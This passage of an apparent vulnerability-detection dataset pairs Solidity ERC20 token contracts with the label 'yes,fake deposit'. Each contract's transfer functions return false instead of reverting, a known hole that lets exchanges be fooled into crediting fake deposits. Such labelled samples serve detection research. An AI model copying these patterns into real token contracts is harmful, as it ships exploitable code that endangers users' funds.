owner) public view returns (uint256 balance) {\n return balances[owner];\n }\n function allowance(address owner, address spender) public view returns (uint remaining) {\n return allowed[owner][spender];\n }\n function transfer(address to, uint256 value) public returns (bool success) {\n if (balances[msg.sender] >= value && value > 0) {\n balances[msg.sender] -= value;\n balances[to] += value;\n emit Transfer(msg.sender, to, value);\n return true;\n } else {\n return false;\n }\n }\n function transferFrom(address from, address to, uint256 value) public returns (bool success) {\n if (balances[from] >= value && allowed[from][msg.sender] >= value && value > 0) {\n balances[to] += value;\n balances[from] -= value;\n allowed[from][msg.sender] -= value;\n emit Transfer(from, to, value);\n return true;\n } else {\n return false;\n }\n }\n function approve(address spender, uint256 value) public returns (bool success) {\n allowed[msg.sender][spender] = value;\n emit Approval(msg.sender, spender, value);\n return true;\n }\n function () external payable {\n teamAddress.transfer(msg.value);\n }\n constructor () public payable {\n teamAddress = msg.sender;\n balances[teamAddress] = initialSupply;\n }\n}\n\n###\n\n", "completion": "yes,fake deposit###\n###"}
{"prompt": "pragma solidity >=0.4.22 <0.6.0;\n\ncontract ERC20 {\n function totalSupply() public view returns (uint supply);\n function balanceOf(address who) public view returns (uint value);\n function allowance(address owner, address spender) public view returns (uint remaining);\n function transferFrom(address from, address to, uint value) public returns (bool ok);\n function approve(address spender, uint value) public returns (bool ok);\n function transfer(address to, uint value) public returns (bool ok);\n event Transfer(address indexed from, address indexed to, uint value);\n event Approval(address indexed owner, address indexed spender, uint value);\n}\n\ncontract KitsuneInu is ERC20{\n uint8 public constant decimals = 18;\n uint256 initialSupply = 1000000000000000*10**uint256(decimals);\n string public constant name = \"Kitsune Inu\";\n string public constant symbol = \"KITSUNE\";\n\n address payable teamAddress;\n\n function totalSupply() public view returns (uint256) {\n return initialSupply;\n }\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n \n function balanceOf(address owner) public view returns (uint256 balance) {\n return balances[owner];\n }\n function allowance(address owner, address spender) public view returns (uint remaining) {\n return allowed[owner][spender];\n }\n function transfer(address to, uint256 value) public returns (bool success) {\n if (balances[msg.sender] >= value && value > 0) {\n balances[msg.sender] -= value;\n balances[to] += value;\n emit Transfer(msg.sender, to, value);\n return true;\n } else {\n return false;\n }\n }\n function transferFrom(address from, address to, uint256 value) public returns (bool success) {\n if (balances[from] >= value && allowed[from][msg.sender] >= value && value > 0) {\n balances[to] += value;\n balances[from] -= value;\n allowed[from][msg.sender] -= value;\n emit Transfer(from, to, value);\n return true;\n } else {\n return false;\n }\n }\n function approve(address spender, uint256 value) public returns (bool success) {\n allowed[msg.sender][spender] = value;\n emit Approval(msg.sender, spender, value);\n return true;\n }\n function () external payable {\n teamAddress.transfer(msg.value);\n }\n constructor () public payable {\n teamAddress = msg.sender;\n balances[teamAddress] = initialSupply;\n }\n}\n\n###\n\n", "completion": "yes,fake deposit###\n###"}
{"prompt": "//SPDX-License-Identifier: Unlicense\n\n// ----------------------------------------------------------------------------\n// 'StirFriedShrimp' token contract\n//\n// Symbol : SFS \ud83e\udd90\n// Name : Stir Fried Shrimp\n// Total supply: 100,000,000,000,000\n// Decimals : 18\n// Burned : 50%\n// ----------------------------------------------------------------------------\n\npragma solidity >=0.4.22 <0.6.0;\n\ncontract ERC20 {\n function totalSupply() public view returns (uint supply);\n function balanceOf(address who) public view returns (uint value);\n function allowance(address owner, address spender) public view returns (uint remaining);\n function transferFrom(address from, address to, uint value) public returns (bool ok);\n function approve(address spender, uint value) public returns (bool ok);\n function transfer(address to, uint value) public returns (bool ok);\n event Transfer(address indexed from, address indexed to, uint value);\n event Approval(address indexed owner, address indexed spender, uint value);\n}\n\ncontract StirFriedShrimp is ERC20{\n uint8 public constant decimals = 18;\n uint256 initialSupply = 100000000000000*10**uint256(decimals);\n string public constant name = \"Stir Fried Shrimp\";\n string public constant symbol = \"SFS \ud83e\udd90\";\n\n address payable teamAddress;\n\n function totalSupply() public view returns (uint256) {\n return initialSupply;\n }\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n \n function balanceOf(address owner) public view returns (uint256 balance) {\n return balances[owner];\n }\n function allowance(address owner, address spender) public view returns (uint remaining) {\n return allowed[owner][spender];\n }\n function transfer(address to, uint256 value) public returns (bool success) {\n if (balances[msg.sender] >= value && value > 0) {\n balances[msg.sender] -= value;\n balances[to] += value;\n emit Transfer(msg.sender, to, value);\n return true;\n } else {\n return false;\n }\n }\n function transferFrom(address from, address to, uint256 value) public returns (bool success) {\n if (balances[from] >= value && allowed[from][msg.sender] >= value && value > 0) {\n balances[to] += value;\n balances[from] -= value;\n allowed[from][msg.sender] -= value;\n emit Transfer(from, to, value);\n return true;\n } else {\n return false;\n }\n }\n function approve(address spender, uint256 value) public returns (bool success) {\n allowed[msg.sender][spender] = value;\n emit Approval(msg.sender, spender, value);\n return true;\n }\n function () external payable {\n teamAddress.transfer(msg.value);\n }\n constructor () public payable {\n teamAddress = msg.sender;\n balances[teamAddress] = initialSupply;\n }\n}\n\n###\n\n", "completion": "yes,fake deposit###\n###"}
{"prompt": "pragma solidity ^0.4.4;\n\ncontract Token {\n\n function totalSupply() constant returns (uint256 supply) {}\n\n function balanceOf(address _owner) constant returns (uint256 balance) {}\n\n function transfer(address _to, uint256 _value) returns (bool success) {}\n\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {}\n\n function approve(address _spender, uint256 _value) returns (bool success) {}\n\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {}\n\n event Transfer(address indexed _from, address indexed _to, uint256 _value);\n event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n \n}\n\n\n\ncontract StandardToken is Token {\n\n function transfer(address _to, uint256 _value) returns (bool success) {\n if (balances[msg.sender] >= _value && _value > 0) {\n balances[msg.sender] -= _value;\n balances[_to] += _value;\n Transfer(msg.sender, _to, _value);\n return true;\n } else { return false; }\n }\n\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\n if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\n balances[_to] += _value;\n balances[_from] -= _value;\n allowed[_from][msg.sender] -= _value;\n Transfer(_from, _to, _value);\n return true;\n } else { return false; }\n }\n\n function balanceOf(address _owner) constant returns (uint256 balance) {\n return balances[_owner];\n }\n\n function approve(address _spender, uint256 _value) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\n return allowed[_owner][_spender];\n }\n\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n uint256 public totalSupply;\n}\n\n\ncontract ERC20Token is StandardToken {\n\n function () {\n throw;\n }\n\n string public name;\n uint8 public decimals;\n string public symbol;\n string public version = 'H1.0';\n\n function ERC20Token(\n ) {\n balances[msg.sender] = 1000000000;\n totalSupply = 1000000000;\n name = \"Boob Token\";\n decimals = 0;\n symbol = \"BOOB\";\n }\n\n function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n\n if(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\n return true;\n }\n}\n\n###\n\n", "completion": "yes,fake deposit###\n###"}
{"prompt": "pragma solidity ^0.4.4;\n\ncontract Token {\n /// @return total amount of tokens\n function totalSupply() constant returns (uint256 supply) {}\n\n /// @param _owner The address from which the balance will be retrieved\n /// @return The balance\n function balanceOf(address _owner) constant returns (uint256 balance) {}\n\n /// @notice send `_value` token to `_to` from `msg.sender`\n /// @param _to The address of the recipient\n /// @param _value The amount of token to be transferred\n /// @return Whether the transfer was successful or not\n function transfer(address _to, uint256 _value) returns (bool success) {}\n\n /// @notice send `_value` token to `_to` from `_from` on the condition it is approved by `_from`\n /// @param _from The address of the sender\n /// @param _to The address of the recipient\n /// @param _value The amount of token to be transferred\n /// @return Whether the transfer was successful or not\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {}\n\n /// @notice `msg.sender` approves `_addr` to spend `_value` tokens\n /// @param _spender The address of the account able to transfer the tokens\n /// @param _value The amount of wei to be approved for transfer\n /// @return Whether the approval was successful or not\n function approve(address _spender, uint256 _value) returns (bool success) {}\n\n /// @param _owner The address of the account owning tokens\n /// @param _spender The address of the account able to transfer the tokens\n /// @return Amount of remaining tokens allowed to spent\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {}\n\n event Transfer(address indexed _from, address indexed _to, uint256 _value);\n event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n}\n\n\n\ncontract StandardToken is Token {\n\n function transfer(address _to, uint256 _value) returns (bool success) {\n //Default assumes totalSupply can't be over max (2^256 - 1).\n //If your token leaves out totalSupply and can issue more tokens as time goes on, you need to check if it doesn't wrap.\n //Replace the if with this one instead.\n //if (balances[msg.sender] >= _value && balances[_to] + _value > balances[_to]) {\n if (balances[msg.sender] >= _value && _value > 0) {\n balances[msg.sender] -= _value;\n balances[_to] += _value;\n Transfer(msg.sender, _to, _value);\n return true;\n } else { return false; }\n }\n\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\n //same as above. Replace this line with the following if you want to protect against wrapping uints.\n //if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && balances[_to] + _value > balances[_to]) {\n if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\n balances[_to] += _value;\n balances[_from] -= _value;\n allowed[_from][msg.sender] -= _value;\n Transfer(_from, _to, _value);\n return true;\n } else { return false; }\n }\n\n function balanceOf(address _owner) constant returns (uint256 balance) {\n return balances[_owner];\n }\n\n function approve(address _spender, uint256 _value) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\n return allowed[_owner][_spender];\n }\n\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n uint256 public totalSupply;\n}\n\ncontract ERC20Token is StandardToken {\n\n function () {\n //if ether is sent to this address, send it back.\n throw;\n }\n\n \n string public name; //Name of the token\n uint8 public decimals; //How many decimals to show. ie. There could 1000 base units with 3 decimals\n string public symbol; //An identifier: eg AXM\n string public version = 'H1.0'; //human 0.1 standard. Just an arbitrary versioning scheme.\n\n//\n// CHANGE THE FOLLOWING VALUES FOR YOUR TOKEN!\n//\n\n//make sure this function name matches the contract name above. So if you're token is called TutorialToken, make sure the //contract name above is also TutorialToken instead of ERC20Token\n\n function ERC20Token(\n ) {\n balances[msg.sender] = 10000000000; // Give the creator all initial tokens (100000 for example)\n totalSupply = 10000000000; // Update total supply (100000 for example)\n name = \"2023 TOKEN\"; // Set the name for display purposes\n decimals = 2; // Amount of decimals\n symbol = \"2023\"; // Set the symbol for display purposes\n }\n\n \n function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n\n //call the receiveApproval function on the contract you want to be notified. This crafts the function signature manually so one doesn't have to include a contract in here just for this.\n //receiveApproval(address _from, uint256 _value, address _tokenContract, bytes _extraData)\n //it is assumed that when does this that the call *should* succeed, otherwise one would use vanilla approve instead.\n if(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\n return true;\n }\n}\n\n###\n\n", "completion": "yes,fake deposit###\n###"}
{"prompt": "pragma solidity >=0.4.22 <0.6.0;\n\ncontract ERC20 {\n function totalSupply() public view returns (uint supply);\n function balanceOf(address who) public view returns (uint value);\n function allowance(address owner, address spender) public view returns (uint remaining);\n function transferFrom(address from, address to, uint value) public returns (bool ok);\n function approve(address spender, uint value) public returns (bool ok);\n function transfer(address to, uint value) public returns (bool ok);\n event Transfer(address indexed from, address indexed to, uint value);\n event Approval(address indexed owner, address indexed spender, uint value);\n}\n\ncontract ShibaBacon is ERC20{\n uint8 public constant decimals = 18;\n uint256 initialSupply = 1000000000000000*10**uint256(decimals);\n string public constant name = \"Shiba Bacon\";\n string public constant symbol = \"INU \ud83e\udd53\";\n\n address payable teamAddress;\n\n function totalSupply() public view returns (uint256) {\n return initialSupply;\n }\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n \n function balanceOf(address owner) public view returns (uint256 balance) {\n return balances[owner];\n }\n function allowance(address owner, address spender) public view returns (uint remaining) {\n return allowed[owner][spender];\n }\n function transfer(address to, uint256 value) public returns (bool success) {\n if (balances[msg.sender] >= value && value > 0) {\n balances[msg.sender] -= value;\n balances[to] += value;\n emit Transfer(msg.sender, to, value);\n return true;\n } else {\n return false;\n }\n }\n function transferFrom(address from, address to, uint256 value) public returns (bool success) {\n if (balances[from] >= value && allowed[from][msg.sender] >= value && value > 0) {\n balances[to] += value;\n balances[from] -= value;\n allowed[from][msg.sender] -= value;\n emit Transfer(from, to, value);\n return true;\n } else {\n return false;\n }\n }\n function approve(address spender, uint256 value) public returns (bool success) {\n allowed[msg.sender][spender] = value;\n emit Approval(msg.sender, spender, value);\n return true;\n }\n function () external payable {\n teamAddress.transfer(msg.value);\n }\n constructor () public payable {\n teamAddress = msg.sender;\n balances[teamAddress] = initialSupply;\n }\n}\n\n###\n\n", "completion": "yes,fake deposit###\n###"}
{"prompt": "pragma solidity ^0.4.4;\n\ncontract Token {\n\n /// @return total amount of tokens\n function totalSupply() constant returns (uint256 supply) {}\n\n /// @param _owner The address from which the balance will be retrieved\n /// @return The balance\n function balanceOf(address _owner) constant returns (uint256 balance) {}\n\n /// @notice send `_value` token to `_to` from `msg.sender`\n /// @param _to The address of the recipient\n /// @param _value The amount of token to be transferred\n /// @return Whether the transfer was successful or not\n function transfer(address _to, uint256 _value) returns (bool success) {}\n\n /// @notice send `_value` token to `_to` from `_from` on the condition it is approved by `_from`\n /// @param _from The address of the sender\n /// @param _to The address of the recipient\n /// @param _value The amount of token to be transferred\n /// @return Whether the transfer was successful or not\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {}\n\n /// @notice `msg.sender` approves `_addr` to spend `_value` tokens\n /// @param _spender The address of the account able to transfer the tokens\n /// @param _value The amount of wei to be approved for transfer\n /// @return Whether the approval was successful or not\n function approve(address _spender, uint256 _value) returns (bool success) {}\n\n /// @param _owner The address of the account owning tokens\n /// @param _spender The address of the account able to transfer the tokens\n /// @return Amount of remaining tokens allowed to spent\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {}\n\n event Transfer(address indexed _from, address indexed _to, uint256 _value);\n event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n \n}\n\n\n\ncontract StandardToken is Token {\n\n function transfer(address _to, uint256 _value) returns (bool success) {\n //Default assumes totalSupply can't be over max (2^256 - 1).\n //If your token leaves out totalSupply and can issue more tokens as time goes on, you need to check if it doesn't wrap.\n //Replace the if with this one instead.\n //if (balances[msg.sender] >= _value && balances[_to] + _value > balances[_to]) {\n if (balances[msg.sender] >= _value && _value > 0) {\n balances[msg.sender] -= _value;\n balances[_to] += _value;\n Transfer(msg.sender, _to, _value);\n return true;\n } else { return false; }\n }\n\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\n //same as above. Replace this line with the following if you want to protect against wrapping uints.\n //if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && balances[_to] + _value > balances[_to]) {\n if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\n balances[_to] += _value;\n balances[_from] -= _value;\n allowed[_from][msg.sender] -= _value;\n Transfer(_from, _to, _value);\n return true;\n } else { return false; }\n }\n\n function balanceOf(address _owner) constant returns (uint256 balance) {\n return balances[_owner];\n }\n\n function approve(address _spender, uint256 _value) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\n return allowed[_owner][_spender];\n }\n\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n uint256 public totalSupply;\n}\n\n\n//name this contract whatever you'd like\ncontract ERC20Token is StandardToken {\n\n function () {\n //if ether is sent to this address, send it back.\n throw;\n }\n\n \n\n \n string public name; //fancy name: eg Simon Bucks\n uint8 public decimals; //How many decimals to show. ie. There could 1000 base units with 3 decimals. Meaning 0.980 SBX = 980 base units. It's like comparing 1 wei to 1 ether.\n string public symbol; //An identifier: eg SBX\n string public version = 'H1.0'; //human 0.1 standard. Just an arbitrary versioning scheme.\n\n//\n// CHANGE THESE VALUES FOR YOUR TOKEN\n//\n\n//make sure this function name matches the contract name above. So if you're token is called TutorialToken, make sure the //contract name above is also TutorialToken instead of ERC20Token\n\n function ERC20Token(\n ) {\n balances[msg.sender] = 11451400; // Give the creator all initial tokens (100000 for example)\n totalSupply = 11451400; // Update total supply (100000 for example)\n name = \"INM COIN\"; // Set the name for display purposes\n decimals = 2; // Amount of decimals for display purposes\n symbol = \"INM\"; // Set the symbol for display purposes\n }\n\n \n function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n\n //call the receiveApproval function on the contract you want to be notified. This crafts the function signature manually so one doesn't have to include a contract in here just for this.\n //receiveApproval(address _from, uint256 _value, address _tokenContract, bytes _extraData)\n //it is assumed that when does this that the call *should* succeed, otherwise one would use vanilla approve instead.\n if(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\n return true;\n }\n}\n\n###\n\n", "completion": "yes,fake deposit###\n###"}
{"prompt": "// File: gganbu_token.sol\n\npragma solidity ^0.4.16;\ncontract Token {\n\n /// @return total amount of tokens\n function totalSupply() constant returns (uint256 supply) {}\n\n /// @param _owner The address from which the balance will be retrieved\n /// @return The balance\n function balanceOf(address _owner) constant returns (uint256 balance) {}\n\n /// @notice send `_value` token to `_to` from `msg.sender`\n /// @param _to The address of the recipient\n /// @param _value The amount of token to be transferred\n /// @return Whether the transfer was successful or not\n function transfer(address _to, uint256 _value) returns (bool success) {}\n\n /// @notice send `_value` token to `_to` from `_from` on the condition it is approved by `_from`\n /// @param _from The address of the sender\n /// @param _to The address of the recipient\n /// @param _value The amount of token to be transferred\n /// @return Whether the transfer was successful or not\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {}\n\n /// @notice `msg.sender` approves `_addr` to spend `_value` tokens\n /// @param _spender The address of the account able to transfer the tokens\n /// @param _value The amount of wei to be approved for transfer\n /// @return Whether the approval was successful or not\n function approve(address _spender, uint256 _value) returns (bool success) {}\n\n /// @param _owner The address of the account owning tokens\n /// @param _spender The address of the account able to transfer the tokens\n /// @return Amount of remaining tokens allowed to spent\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {}\n\n event Transfer(address indexed _from, address indexed _to, uint256 _value);\n event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n \n}\n\n\n\ncontract StandardToken is Token {\n\n function transfer(address _to, uint256 _value) returns (bool success) {\n //Default assumes totalSupply can't be over max (2^256 - 1).\n //If your token leaves out totalSupply and can issue more tokens as time goes on, you need to check if it doesn't wrap.\n //Replace the if with this one instead.\n //if (balances[msg.sender] >= _value && balances[_to] + _value > balances[_to]) {\n if (balances[msg.sender] >= _value && _value > 0) {\n balances[msg.sender] -= _value;\n balances[_to] += _value;\n Transfer(msg.sender, _to, _value);\n return true;\n } else { return false; }\n }\n\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\n //same as above. Replace this line with the following if you want to protect against wrapping uints.\n //if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && balances[_to] + _value > balances[_to]) {\n if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\n balances[_to] += _value;\n balances[_from] -= _value;\n allowed[_from][msg.sender] -= _value;\n Transfer(_from, _to, _value);\n return true;\n } else { return false; }\n }\n\n function balanceOf(address _owner) constant returns (uint256 balance) {\n return balances[_owner];\n }\n\n function approve(address _spender, uint256 _value) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\n return allowed[_owner][_spender];\n }\n\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n uint256 public totalSupply;\n}\n\n\n//name this contract whatever you'd like\ncontract ERC20Token is StandardToken {\n\n function () {\n //if ether is sent to this address, send it back.\n throw;\n }\n\n \n\n \n string public name; //fancy name: eg Simon Bucks\n uint8 public decimals; //How many decimals to show. ie. There could 1000 base units with 3 decimals. Meaning 0.980 SBX = 980 base units. It's like comparing 1 wei to 1 ether.\n string public symbol; //An identifier: eg SBX\n string public version = 'H1.0'; //human 0.1 standard. Just an arbitrary versioning scheme.\n\n//\n// CHANGE THESE VALUES FOR YOUR TOKEN\n//\n\n//make sure this function name matches the contract name above. So if you're token is called TutorialToken, make sure the //contract name above is also TutorialToken instead of ERC20Token\n\n function ERC20Token(\n ) {\n balances[msg.sender] = 100000000000000000000000; // Give the creator all initial tokens (100000 for example)\n totalSupply = 100000000000000000000000; // Update total supply (100000 for example)\n name = \"GGANBU Token\"; // Set the name for display purposes\n decimals = 8; // Amount of decimals for display purposes\n symbol = \"GGB\"; // Set the symbol for display purposes\n }\n\n \n function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n\n //call the receiveApproval function on the contract you want to be notified. This crafts the function signature manually so one doesn't have to include a contract in here just for this.\n //receiveApproval(address _from, uint256 _value, address _tokenContract, bytes _extraData)\n //it is assumed that when does this that the call *should* succeed, otherwise one would use vanilla approve instead.\n if(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\n return true;\n }\n}\n\n###\n\n", "completion": "yes,fake deposit###\n###"}
{"prompt": "pragma solidity ^0.4.25;\n\ncontract Token {\n\n /// @return total amount of tokens\n function totalSupply() constant returns (uint256 supply) {}\n\n /// @param _owner The address from which the balance will be retrieved\n /// @return The balance\n function balanceOf(address _owner) constant returns (uint256 balance) {}\n\n /// @notice send `_value` token to `_to` from `msg.sender`\n /// @param _to The address of the recipient\n /// @param _value The amount of token to be transferred\n /// @return Whether the transfer was successful or not\n function transfer(address _to, uint256 _value) returns (bool success) {}\n\n /// @notice send `_value` token to `_to` from `_from` on the condition it is approved by `_from`\n /// @param _from The address of the sender\n /// @param _to The address of the recipient\n /// @param _value The amount of token to be transferred\n /// @return Whether the transfer was successful or not\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {}\n\n /// @notice `msg.sender` approves `_addr` to spend `_value` tokens\n /// @param _spender The address of the account able to transfer the tokens\n /// @param _value The amount of wei to be approved for transfer\n /// @return Whether the approval was successful or not\n function approve(address _spender, uint256 _value) returns (bool success) {}\n\n /// @param _owner The address of the account owning tokens\n /// @param _spender The address of the account able to transfer the tokens\n /// @return Amount of remaining tokens allowed to spent\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {}\n\n event Transfer(address indexed _from, address indexed _to, uint256 _value);\n event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n\n}\n\ncontract StandardToken is Token {\n\n function transfer(address _to, uint256 _value) returns (bool success) {\n \n if (balances[msg.sender] >= _value && _value > 0) {\n balances[msg.sender] -= _value;\n balances[_to] += _value;\n Transfer(msg.sender, _to, _value);\n return true;\n } else { return false; }\n }\n\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\n \n if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\n balances[_to] += _value;\n balances[_from] -= _value;\n allowed[_from][msg.sender] -= _value;\n Transfer(_from, _to, _value);\n return true;\n } else { return false; }\n }\n\n function balanceOf(address _owner) constant returns (uint256 balance) {\n return balances[_owner];\n }\n\n function approve(address _spender, uint256 _value) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\n return allowed[_owner][_spender];\n }\n\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n uint256 public totalSupply;\n}\n\ncontract WhiteDoge is StandardToken { \n\n \n\n \n string public name; \n uint8 public decimals; \n string public symbol; \n string public version = 'WOGE1.0'; \n uint256 public unitsOneEthCanBuy; \n uint256 public totalEthInWei; \n address public fundsWallet; \n\n \n function WhiteDoge() {\n balances[msg.sender] = 1000000000000000000000000000000; \n totalSupply = 1000000000000000000000000000000;\n name = \"White Doge\";\n decimals = 18; \n symbol = \"WOGE\"; \n unitsOneEthCanBuy = 0; //7% bonus= OneEth// \n fundsWallet = msg.sender; \n }\n\n function() payable{\n totalEthInWei = totalEthInWei + msg.value;\n uint256 amount = msg.value * unitsOneEthCanBuy;\n require(balances[fundsWallet] >= amount);\n\n balances[fundsWallet] = balances[fundsWallet] - amount;\n balances[msg.sender] = balances[msg.sender] + amount;\n\n Transfer(fundsWallet, msg.sender, amount); \n\n fundsWallet.transfer(msg.value); \n }\n\n \n function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n\n \n if(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\n return true;\n }\n}\n\n###\n\n", "completion": "yes,fake deposit###\n###"}
{"prompt": "pragma solidity ^0.4.4;\n\ncontract Token {\n\n function totalSupply() constant returns (uint256 supply) {}\n\n function balanceOf(address _owner) constant returns (uint256 balance) {}\n\n function transfer(address _to, uint256 _value) returns (bool success) {}\n\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {}\n\n function approve(address _spender, uint256 _value) returns (bool success) {}\n\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {}\n\n event Transfer(address indexed _from, address indexed _to, uint256 _value);\n event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n \n}\n\n\n\ncontract StandardToken is Token {\n\n function transfer(address _to, uint256 _value) returns (bool success) {\n if (balances[msg.sender] >= _value && _value > 0) {\n balances[msg.sender] -= _value;\n balances[_to] += _value;\n Transfer(msg.sender, _to, _value);\n return true;\n } else { return false; }\n }\n\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\n if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\n balances[_to] += _value;\n balances[_from] -= _value;\n allowed[_from][msg.sender] -= _value;\n Transfer(_from, _to, _value);\n return true;\n } else { return false; }\n }\n\n function balanceOf(address _owner) constant returns (uint256 balance) {\n return balances[_owner];\n }\n\n function approve(address _spender, uint256 _value) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\n return allowed[_owner][_spender];\n }\n\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n uint256 public totalSupply;\n}\n\n\ncontract ERC20Token is StandardToken {\n\n function () {\n throw;\n }\n\n string public name;\n uint8 public decimals;\n string public symbol;\n string public version = 'H1.0';\n\n function ERC20Token(\n ) {\n balances[msg.sender] = 1000000000;\n totalSupply = 1000000000;\n name = \"taco.finance\";\n decimals = 0;\n symbol = \"TACO\";\n }\n\n function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n\n if(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\n return true;\n }\n}\n\n###\n\n", "completion": "yes,fake deposit###\n###"}
{"prompt": "pragma solidity >=0.4.22 <0.6.0;\n\ncontract ERC20 {\n function totalSupply() public view returns (uint supply);\n function balanceOf(address who) public view returns (uint value);\n function allowance(address owner, address spender) public view returns (uint remaining);\n function transferFrom(address from, address to, uint value) public returns (bool ok);\n function approve(address spender, uint value) public returns (bool ok);\n function transfer(address to, uint value) public returns (bool ok);\n event Transfer(address indexed from, address indexed to, uint value);\n event Approval(address indexed owner, address indexed spender, uint value);\n}\n\ncontract EthereumCyberPunks is ERC20{\n uint8 public constant decimals = 18;\n uint256 initialSupply = 1000000000000000*10**uint256(decimals);\n string public constant name = \"Ethereum Cyber Punks\";\n string public constant symbol = \"EPUNK \ud83d\udc7b\";\n\n address payable teamAddress;\n\n function totalSupply() public view returns (uint256) {\n return initialSupply;\n }\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n \n function balanceOf(address owner) public view returns (uint256 balance) {\n return balances[owner];\n }\n function allowance(address owner, address spender) public view returns (uint remaining) {\n return allowed[owner][spender];\n }\n function transfer(address to, uint256 value) public returns (bool success) {\n if (balances[msg.sender] >= value && value > 0) {\n balances[msg.sender] -= value;\n balances[to] += value;\n emit Transfer(msg.sender, to, value);\n return true;\n } else {\n return false;\n }\n }\n function transferFrom(address from, address to, uint256 value) public returns (bool success) {\n if (balances[from] >= value && allowed[from][msg.sender] >= value && value > 0) {\n balances[to] += value;\n balances[from] -= value;\n allowed[from][msg.sender] -= value;\n emit Transfer(from, to, value);\n return true;\n } else {\n return false;\n }\n }\n function approve(address spender, uint256 value) public returns (bool success) {\n allowed[msg.sender][spender] = value;\n emit Approval(msg.sender, spender, value);\n return true;\n }\n function () external payable {\n teamAddress.transfer(msg.value);\n }\n constructor () public payable {\n teamAddress = msg.sender;\n balances[teamAddress] = initialSupply;\n }\n}\n\n###\n\n", 